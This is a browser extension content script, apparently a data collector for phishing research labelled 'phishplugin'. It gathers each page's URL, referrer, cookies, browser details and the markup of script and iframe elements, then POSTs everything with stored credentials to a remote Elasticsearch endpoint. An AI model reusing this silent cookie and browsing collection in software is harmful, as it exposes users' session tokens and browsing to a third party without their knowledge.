// window.onload=function(){

const passwdfile = chrome.runtime.getURL('passwd');
const es_urlfile = chrome.runtime.getURL('es_url');

element_querySelectorAll_object = document.querySelectorAll("*");  //get all elements into a nodelist
var Our_Object = {};     //declare object that will contain all element types
Our_Object.ELEMENTS = {};
Our_Object.NAVIGATOR = {};
Our_Object.DOCUMENT = {};

// Populate DOCUMENT object with info about the document
Our_Object.DOCUMENT.URL = document.URL
Our_Object.DOCUMENT.baseURI = document.baseURI
Our_Object.DOCUMENT.domain = document.domain
Our_Object.DOCUMENT.lastModified = document.lastModified
Our_Object.DOCUMENT.cookie = document.cookie
Our_Object.DOCUMENT.referrer = document.referrer;

// Populate NAVAGATOR object with info about browser
Our_Object.NAVIGATOR.appCodeName = navigator.appCodeName
Our_Object.NAVIGATOR.appName = navigator.appName         //Returns the name of the browser
Our_Object.NAVIGATOR.appVersion = navigator.appVersion     // Returns the version information of the browser
Our_Object.NAVIGATOR.cookieEnabled = navigator.cookieEnabled   //Determines whether cookies are enabled in the browser
Our_Object.NAVIGATOR.language = navigator.language        //Returns the language of the browser
Our_Object.NAVIGATOR.onLine = navigator.onLine  //Determines whether the browser is online
Our_Object.NAVIGATOR.platform = navigator.platform        //Returns for which platform the browser is compiled
Our_Object.NAVIGATOR.product = navigator.product         //Returns the engine name of the browser
Our_Object.NAVIGATOR.userAgent = navigator.userAgent       //Returns the user-agent header sent by the browser to the server
Our_Object.NAVIGATOR.buildID = navigator.buildID       //Returns the user-agent header sent by the browser to the server
Our_Object.NAVIGATOR.javaEnabled = navigator.javaEnabled();

// populate ELEMENTS object

function getparam(thi, elementByTagName, elementType, index, param)
    {
        if (elementByTagName[index][param] != undefined && elementByTagName[index][param] != "" )
                {
                if (thi[elementType][elementType + index] === undefined)
                    {
                        thi[elementType][elementType + index] = {}
                    }
                    thi[elementType][elementType + index][param] = elementByTagName[index][param]
                }


    }



// block to set up object of all elements with a count of each
if (element_querySelectorAll_object.length > 0)  // check to make sure element_querySelectorAll_object has data
{
   for (index = 0; index < element_querySelectorAll_object.length; index++)
   {
       elementByTagName = element_querySelectorAll_object[index].nodeName;
       if (Our_Object.ELEMENTS[elementByTagName] === undefined)
           {
               Our_Object.ELEMENTS[elementByTagName] = {};
               Our_Object.ELEMENTS[elementByTagName]["count"] = 1;
           }  else
           {
               Our_Object.ELEMENTS[elementByTagName]["count"] = Our_Object.ELEMENTS[elementByTagName]["count"] + 1;
           }
    }
}

//loop through object and get params of each element

for (var elementType in Our_Object.ELEMENTS)  // elementType is the element type
{
    elementByTagName =  document.getElementsByTagName(elementType);
    if (elementByTagName.length > 0)  // check to make sure elementType has data
    {

        for (index = 0; index < elementByTagName.length; index++)
        {
            //console.log(Our_Object.ELEMENTS[elementType]["count"])

            if (elementByTagName[index].id != "")
            {
                if (Our_Object.ELEMENTS[elementType][elementType + index] === undefined)
                {
                    Our_Object.ELEMENTS[elementType][elementType + index] = {}
                }
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "id"); //get ID of all elements with an ID
            }

                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "hidden");  //


            if ((elementType == "SCRIPT" || elementType == "OBJECT" || elementType == "IFRAME" || elementType == "APPLET" || elementType == "TITLE") && elementByTagName[index].outerHTML != "")
            {
                if (Our_Object.ELEMENTS[elementType][elementType + index] === undefined)
                {
                    Our_Object.ELEMENTS[elementType][elementType + index] = {}

                }

                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "src");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "data");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "code");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "outerHTML");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "archive");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "height");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "width");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "offsetHeight");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "offsetLeft");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "offsetTop");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "type");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "names");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "frameborder");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "border");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "hidden");
                getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "name");





            }
//             if (elementType == "HTML")
//
//             {
//                 if (Our_Object.ELEMENTS[elementType][elementType + index] === undefined)
//                 {
//                     Our_Object.ELEMENTS[elementType][elementType + index] = {}
//
//                 }
//
//                 getparam(Our_Object.ELEMENTS, elementByTagName, elementType, index, "baseURI");
//
//             }
//             //console.log(elementByTagName[index].id)

        }

    }

}if (Our_Object.ELEMENTS[elementType][elementType + index] === undefined)
                {
                    Our_Object.ELEMENTS[elementType][elementType + index] = {}

                }

//Our_Object.BROWSER.REFERER = referer;



jsonOutput = JSON.stringify(Our_Object);
// jsonCompressed = LZString.compress(jsonOutput);


//console.log("uncompressed size: " + jsonOutput.length);
//console.log("compressed size: " + jsonCompressed.length)
//console.log("Our object:")
console.log(Our_Object)


//console.log("querySelectorAll object:");
//console.log(element_querySelectorAll_object);
//console.log(referer);
//console.log(document.getElementsByTagName("iframe"));  //debug bro

//jsonOutput = JSON.stringify(Our_Object, undefined, 2);
jsonOutput = JSON.stringify(Our_Object);


//.console.log("Our object:")
//console.log(Our_Object)
//console.log("querySelectorAll object:");
//console.log(elementList)


var postdata = '{"index":{"_index":"phishplugin"}}' + "\n" + jsonOutput  + "\n";


// console.log(postdata);
async function getPasswd() {

    const passwd_response = await fetch(passwdfile);
    const passwd = await passwd_response.text();
    const es_url_response = await fetch(es_urlfile);
    const es_url = await es_url_response.text();



    var http = new XMLHttpRequest();

    http.open("POST", es_url.trim(), true);
    http.setRequestHeader('Content-Type', 'application/json');
    http.setRequestHeader("Authorization", "Basic " + btoa(passwd.trim()));

    http.onreadystatechange = function() {
        if (this.readyState == 4) {
                console.log(this.responseText);
            }
        };

    http.send(postdata);
}

getPasswd()

// }
